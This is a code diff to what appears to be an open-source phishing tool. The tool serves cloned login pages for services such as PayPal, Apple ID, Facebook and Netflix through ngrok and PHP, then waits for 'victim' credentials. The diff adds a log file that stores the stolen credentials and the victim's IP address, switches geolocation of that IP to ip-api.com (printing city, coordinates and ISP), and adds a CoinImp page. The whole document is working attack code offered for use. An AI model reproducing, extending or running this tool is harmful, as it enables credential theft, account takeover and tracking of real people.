@@ -3,9 +3,11 @@ import subprocess
 from sys import exit
 import platform
 from zipfile import ZipFile
-from os import walk,path,getcwd,system
+from os import walk,path,getcwd
 from time import sleep
 import threading
+from datetime import datetime
+import json
 
 j=[]
 try:
@@ -16,10 +18,6 @@ try:
     import requests
 except:
     j.append('requests')
-try:
-    from bs4 import BeautifulSoup
-except:
-    j.append('BeautifulSoup4')
 if j:
     print('PLEASE INSTALL THE FOLLOWING MODULES\n')
     for a in j:
@@ -35,7 +33,7 @@ except:
 
 def get_my_ip():
     
-    print(requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2])
+    return requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2]
 
 def ngrok():
     try:
@@ -100,7 +98,7 @@ def attack(server,url,wifi):
                     if 'ip.txt' in file:
                         f = open(path.join(root, file))                    
                         r = f.read()                    
-                        if r and r!=my_ip:
+                        if '.' in r and r!=my_ip:
                             f.seek(0)
                             print()
                             re=f.read()
@@ -111,11 +109,14 @@ def attack(server,url,wifi):
                             ztop = 1
                             f.close()
                             f = open(path.join(root, file),'w+')
+                        else:
+                            open(path.join(root, file),'w+')
                         f.close()
             if ztop:
                 break
     print(colored('[*] Waiting for victim to enter credentials....','yellow',attrs=['bold']))
     ztop = 0
+    cred=''
     while 1:
         for root, dirs, files in walk(getcwd()+'/sites/'+server):
             for file in files:
@@ -123,47 +124,43 @@ def attack(server,url,wifi):
                     f = open(path.join(root, file))                    
                     if f.read():
                         f.seek(0)
-                        print(colored('[*] Victim credentials \n','red',attrs=['bold']))
-                        print(colored(f.read().split('\n')[0],'green',attrs=['bold']))
+                        cred = f.read().split('\n')[0]
+                        print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
+                        print(colored(cred,'green',attrs=['bold']))
                         print()
                         ztop = 1
                         f.close()
                         f = open(path.join(root, file),'w+')
-                    f.close()
-                    
-                            
+                    f.close()                                            
         if ztop:
             break
     subprocess.Popen(['killall','-2', 'ngrok', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
     subprocess.Popen(['killall','-2', 'php', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
-
+    f = open('logs.log','a+')
+    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\n\n')
+    f.close()
 
 def ip_details(ip):
+    
     headers = {
-        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"
+        "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
     }
-    url = 'https://www.ip-tracker.org/locator/ip-lookup.php?ip='+ip
-    r = requests.get(url,headers=headers).content
-    soup = BeautifulSoup(r,'html.parser')
-    l1 = []
-    l2 = []
-    table = soup.find_all('table',class_='table-auto')[0]
-    for a in table.find_all('th'):
-        if not a.attrs:
-            l1.append(a.text)
-    c = 0
-    for b in table.find_all('td'):
-        c+=1
-        if c == 1:
-            l2.append(b.text.split('\n')[0])    
-        elif c == 2:
-            l2.append(b.text.split('\n')[-1])
-        elif c == 23:
-            l2.append(b.text.split('\n')[0])
-        else:
-            l2.append(b.text)
-    for a,b in zip(l1,l2):
-        print(a,b,sep='\t')
+    url = 'http://ip-api.com/json/'+ip.strip('\n')
+    r = requests.get(url,headers=headers).content.decode('utf8')
+    dic = json.loads(r)
+    print('COUNTRY : '+dic['country'])
+    print('COUNTRY CODE : '+dic['countryCode'])
+    print('REGION : '+dic['regionName'])
+    print('CITY : '+dic['city'])
+    print('ZIP CODE : '+dic['zip'])
+    print('LATITUDE : '+str(dic['lat']))
+    print('LONGITUDE : '+str(dic['lon']))
+    print('TIMEZONE : '+dic['timezone'])
+    print('ISP : '+dic['isp'])
+    print('ISP ORGANISATION : '+dic['org'])
+    print('AS : '+dic['as']+'\n')
+    
 
 def main():    
     ngrok()
@@ -189,8 +186,8 @@ def main():
               
 
 [1] ADOBE           [11] INSTAGRAM     [21] TWITCH           [31] FLICKR   
-[2] AMAZON          [12] LINKEDIN      [22] TWITTER          [q/Q] QUIT
-[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS    
+[2] AMAZON          [12] LINKEDIN      [22] TWITTER          [32] COINIMP
+[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS        [q/Q] QUIT
 [4] WIFI            [14] MICROSOFT     [24] YAHOO        
 [5] DROPBOX         [15] NETFLIX       [25] EBAY         
 [6] FACEBOOK        [16] PAYPAL        [26] ORIGIN
@@ -232,7 +229,8 @@ def main():
         28 : 'stackoverflow',
         29 : 'ngrok',
         30 : 'reddit',
-        31 : 'flickr'
+        31 : 'flickr',
+        32 : 'coinimp'
     }
     links = {
         'apple' : 'https://www.apple.com/shop/bag',
@@ -264,7 +262,8 @@ def main():
         'stackoverflow' : 'https://stackoverflow.com/',
         'ngrok' : 'https://ngrok.com/',
         'reddit' : 'https://www.reddit.com/',
-        'flickr' : 'https://www.flickr.com'
+        'flickr' : 'https://www.flickr.com',
+        'coinimp' : 'https://www.coinimp.com/dashboard',
     }
     while 1:        
         print(colored('[*] Select your choice : ','green',attrs=['bold']),end='')
